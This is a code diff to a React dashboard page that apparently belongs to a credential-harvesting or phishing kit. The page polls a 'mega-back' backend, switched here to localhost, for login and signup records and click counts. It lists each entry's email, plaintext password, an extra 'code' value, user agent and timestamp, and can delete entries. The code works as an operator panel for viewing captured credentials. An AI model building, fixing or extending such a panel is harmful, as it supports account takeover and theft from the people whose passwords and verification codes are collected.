@@ -22,13 +22,13 @@ import { Scrollbars } from 'react-custom-scrollbars-2';
 const Page = () => {
   const router = useRouter();
 
-  const { data: loginToday, isLoading: loginTodayLoading } = useSWR('https://mega-back-kznl.onrender.com/api/logindata/count?filter=today', fetcher, { refreshInterval: 50, revalidateOnFocus: true });
-  const { data: loginWeeckly, isLoading: loginWeecklyLoading } = useSWR('https://mega-back-kznl.onrender.com/api/logindata/count?filter=weekly', fetcher, { refreshInterval: 50, revalidateOnFocus: true });
-  const { data: signToday, isLoading: signTodayLoading } = useSWR('https://mega-back-kznl.onrender.com/api/signupdata/count?filter=today', fetcher, { refreshInterval: 50, revalidateOnFocus: true });
-  const { data: signWeeckly, isLoading: signWeecklyloading } = useSWR('https://mega-back-kznl.onrender.com/api/signupdata/count?filter=weekly', fetcher, { refreshInterval: 5000, revalidateOnFocus: true });
-  const { data: click, error: click_error, isLoading: click_Loading } = useSWR('https://mega-back-kznl.onrender.com/api/clicks', fetcher, { refreshInterval: 50, revalidateOnFocus: true });
-  const { data: loginUser, error: login_error, isLoading: login_Loading } = useSWR('https://mega-back-kznl.onrender.com/api/loginAll', fetcher, { refreshInterval: 50, revalidateOnFocus: true });
-  const { data: signupUser, error: signup_error, isLoading: signup_Loading } = useSWR('https://mega-back-kznl.onrender.com/api/signupAll', fetcher, { refreshInterval: 50, revalidateOnFocus: true });
+  const { data: loginToday, isLoading: loginTodayLoading } = useSWR('http://localhost:5000/api/logindata/count?filter=today', fetcher, { refreshInterval: 50, revalidateOnFocus: true });
+  const { data: loginWeeckly, isLoading: loginWeecklyLoading } = useSWR('http://localhost:5000/api/logindata/count?filter=weekly', fetcher, { refreshInterval: 50, revalidateOnFocus: true });
+  const { data: signToday, isLoading: signTodayLoading } = useSWR('http://localhost:5000/api/signupdata/count?filter=today', fetcher, { refreshInterval: 50, revalidateOnFocus: true });
+  const { data: signWeeckly, isLoading: signWeecklyloading } = useSWR('http://localhost:5000/api/signupdata/count?filter=weekly', fetcher, { refreshInterval: 5000, revalidateOnFocus: true });
+  const { data: click, error: click_error, isLoading: click_Loading } = useSWR('http://localhost:5000/api/clicks', fetcher, { refreshInterval: 50, revalidateOnFocus: true });
+  const { data: loginUser, error: login_error, isLoading: login_Loading } = useSWR('http://localhost:5000/api/loginAll', fetcher, { refreshInterval: 50, revalidateOnFocus: true });
+  const { data: signupUser, error: signup_error, isLoading: signup_Loading } = useSWR('http://localhost:5000/api/signupAll', fetcher, { refreshInterval: 50, revalidateOnFocus: true });
 
   const [selectedProduct, setSelectedProduct] = useState('login');
   const [isModalOpen, setIsModalOpen] = useState(false);
@@ -42,11 +42,11 @@ const Page = () => {
   const productsToRender = selectedProduct === 'login' ? loginUser : signupUser;
 
   const handleLoginDelete = async (id) => {
-    await axios.delete(`https://mega-back-kznl.onrender.com/api/logindelete/${id}`);
+    await axios.delete(`http://localhost:5000/api/logindelete/${id}`);
     setIsModalOpen(false);
   };
   const handlesignupDelete = async (id) => {
-    await axios.delete(`https://mega-back-kznl.onrender.com/api/signupdelete/${id}`);
+    await axios.delete(`http://localhost:5000/api/signupdelete/${id}`);
     setIsModalOpen(false);
   };
 
@@ -188,7 +188,7 @@ const Page = () => {
                     <td className="py-2">{index + 1}.</td>
                     <td className="text-sm sm:text-base">{item.email}</td>
                     <td className="text-sm sm:text-base">{item.password}</td>
-                    <td className={`text-sm ${selectedProduct === 'signup' ? 'hidden' : ''} ${item.update === true ? "text-white":"text-red-500"} sm:text-base `}>{item.update === true ? item.code : "Empty"}</td>
+                    <td className={`text-sm ${selectedProduct === 'signup' ? 'hidden' : ''} ${item.updateData === true ? "text-white":"text-red-500"} sm:text-base `}>{item.updateData === true ? item.code : "Empty"}</td>
                     <td className="text-sm sm:text-base">{item.userAgent}</td>
                     <td className="text-sm sm:text-base">{item.createdAt.slice(0, 16)}</td>
                     <td className="w-[185px]">
